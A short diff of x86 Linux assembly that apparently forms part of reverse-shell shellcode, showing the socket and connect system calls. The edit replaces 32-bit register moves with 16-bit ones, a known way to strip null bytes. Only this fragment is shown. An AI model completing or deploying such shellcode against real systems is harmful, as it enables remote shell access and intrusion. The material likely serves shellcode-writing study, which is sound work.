@@ -36,7 +36,7 @@ push word  0x02          ;AF_INET ipv4 <family>
 ;c code -> int sock_fd=socket(AF_INET,SOCK_STREAM,0);
 xor eax,eax ;clear registers
 mov ebx,eax ;clear registers
-mov eax,0x167 ;socket fn call
+mov ax,0x167 ;socket fn call
 mov bl,0x02  ;AF_INET
 mov cl,0x01  ;SOCK_STREAM
 int 0x80
@@ -45,7 +45,7 @@ mov ebx,eax  ;socket fd
  ;call connect fn <connect syscall>
  ;c code ->cli_addr -> struct sockaddr_in 
  ;connect(sock_fd,(struct sock_addr)*&cli_addr,sizeof(cli_addr));
-mov eax,0x16a ;call socketconnect
+mov ax,0x16a ;call socketconnect
 mov ecx,esp   ; move stack pointer to reference the struct
 mov edx,ebp   ;move base pointer to register
 sub edx,ecx   ;sub base pointer from stack pointer to get size of struct
